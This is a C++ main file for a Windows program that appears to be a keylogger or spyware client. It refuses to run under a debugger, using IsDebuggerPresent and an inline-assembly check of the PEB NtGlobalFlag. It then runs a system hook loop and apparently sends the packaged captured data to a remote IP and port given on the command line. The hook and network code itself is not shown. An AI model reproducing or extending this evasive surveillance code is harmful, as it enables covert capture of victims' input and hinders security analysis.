#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <boost/thread.hpp>
#include "Hooker.hh"
#include "reseau/Network.hh"

int	__declspec(naked) isDebugging(void)
{
  __asm {

    mov eax, fs:[0x30]
      mov al, [eax + 10bch]
      and al, 0x70
      cmp al, 0x70
      je yes
      jmp no

      yes:
      mov eax, 1
      ret
      no:
      xor eax, eax
      ret
  }
}

int main(int ac, char **av)
{
	if (IsDebuggerPresent()) {
		return (-1);
	}
	if (ac >= 3)
	{
		try {
			Packager* packager = new Packager();
			Network* network = new Network(av[2], av[1], packager);
			Hooker& hooker = Hooker::getInstance();
			hooker.setPackager(packager);
			boost::thread networkThread(&Network::initNetwork, network);
			hooker.runHookLoop();
			networkThread.join();
		}
		catch (std::exception& e) {
			(void)e;
			std::cerr << "An error occured" << std::endl;
			return EXIT_FAILURE;
		}
		return EXIT_SUCCESS;
	}
	std::cerr << "Usage: " << av[0] << " [ip]" << " [port]" << std::endl;
	return EXIT_FAILURE;
}
